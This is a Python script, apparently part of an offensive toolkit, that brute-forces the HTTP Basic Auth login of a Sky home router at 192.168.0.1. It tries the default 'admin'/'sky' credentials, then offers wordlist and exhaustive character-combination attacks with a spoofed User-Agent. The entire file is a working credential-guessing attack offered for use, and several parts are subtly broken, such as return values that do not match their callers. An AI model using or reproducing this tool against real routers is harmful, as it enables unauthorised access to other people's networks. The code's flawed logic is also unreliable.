import socket
from colorama import Fore, Style
import subprocess
import base64
import os
from colorama import Fore, Style
import random
import itertools

from tools.router.route_atk import proxy as proxy

def main():
    os.system("clear")

    print("""
                   ["""+Fore.RED+"""SKY ATTACK"""+Style.RESET_ALL+"""]
    """)

    def attack(u, pa):
        t = 2
        ex = "Unauthorised"
        while t != 0:
            buffer_size = 8192
            HOST = '192.168.0.1' 
            PORT = 80    
            print("["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] connecting to router")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            both = u+":"+pa
            both = both.encode()
            pas = base64.b64encode(both)
            pass_enc = str(pas)
            pass_enc = pass_enc.replace("b'","")
            pass_enc = pass_enc.replace("'","")
            rr = "Authorization: Basic "+pass_enc
            data = ["GET /sky_router_status.html HTTP/1.1",
            "Host: 192.168.0.1",
            "User-Agent: "+proxy(),
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1",
            "DNT: 1",
            "Sec-GPC: 1",
            rr]
            r = '\r\n'.join(data)+'\r\n\r\n'
            print("["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] sending data...")
            s.send(r.encode())
            print("["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] recv...")
            r = s.recv(buffer_size)
            s.close()
            chk = r.decode()
            print("["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] cheking")
            if ex not in chk:
                os.system("clear")
                print(Fore.GREEN)
                subprocess.run("clear", shell=True)
                print(Style.RESET_ALL+"["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] user and password Found!")
                print(Fore.GREEN+"===========================")
                print("USER : ", use)
                print("PASS : ", pa)
                print("===========================")
                print(Style.RESET_ALL)
                input("[ENTER] hit enter to continue ")
                y = False
                valid = True
                t = 0
                return y, valid
            if t < 0:
                print("["+Fore.RED+"!"+Style.RESET_ALL+"] fatal error veriable(t) is below 0 moving on...")
                break
            else:
                print("["+Fore.RED+"!"+Style.RESET_ALL+"] not found \n["+Fore.RED+"!"+Style.RESET_ALL+"] dubble checking...")
                t = t - 1




    print("["+Fore.RED+"ATTACK"+Style.RESET_ALL+"] trying default user and pass")
    valid = False
    y = True

    use = "admin"
    pa = "sky"
    y, valid = attack(use, pa)

    if valid == False:
        print("1) word list \n2) py-brute")
        cho = int(input("[ENTER] enter choice of a attack: "))

        if cho == 1:
            while not valid:
                try:
                    user = input("enter user file : ")
                    passwords = input("enter pass file : ")
                    user = open(user,"r").readlines()
                    pas = open(passwords,"r").readlines()
                    valid = True
                except Exception:
                    print(Fore.RED)
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] file not found!")
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] enter the full file with path")
                    print("EG: /home/user/file.txt")
                    print(Style.RESET_ALL)
            x = 0
            s = 0
            at = 0
            us = 0
            while y:
                try:
                    use = user[x]
                    use = use.replace("\n","")
                    if us == 0:
                        print("[#] trying user : ", user[x])
                        us = 1
                    else:
                        pass

                except IndexError:
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] all users or tried")
                    y = False
                try:   
                    pa = pas[s]
                    pa = pa.replace("\n","")
                except IndexError:
                    s = 0
                    x = x + 1
                    us = 0
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] moving on to next user")
                at = at + 1
                y = attack(use, pa)
                s = s + 1

        if cho == 2:
            ma = 100
            for i in range(ma):
                PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCBNM', repeat=i) #0123456789ABCDEF
                x = 0
                found = False
                try:
                    for pas in PASSWORD_LIST:
                        pas = str(pas)
                        pas = pas.replace("')","")
                        pas = pas.replace("('","")
                        pas = pas.replace("'","")
                        pas = pas.replace(",","")
                        pas = pas.replace(" ","")
                        u = str(pas)
                        for pss in PASSWORD_LIST:
                            os.system("clear")
                            pss = str(pss)
                            pss = pss.replace("')","")
                            pss = pss.replace("('","")
                            pss = pss.replace("'","")
                            pss = pss.replace(",","")
                            pss = pss.replace(" ","")
                            pa = str(pss)
                            os.system("clear")
                            print("user: ", u)
                            print("pass: ", pa)
                            print("attempt: ", x)
                            found = attack(u, pa)
                            if found == True:
                                print("[!] user and password found quiting....")
                                quit()
                except KeyboardInterrupt:
                    print(Fore.RED)
                    os.system("clear")
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] user interupt")
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] last used")
                    print("user: ", u)
                    print("pass: ", pa)
                    print("attempt: ", x)
                    print(Style.RESET_ALL)
                    input("[ENTER] continue? ")
                except Exception as e:
                    print("["+Fore.RED+"!"+Style.RESET_ALL+"] ERROR: ", e)    
    print("["+Fore.RED+"!"+Style.RESET_ALL+"] atk_sky done!")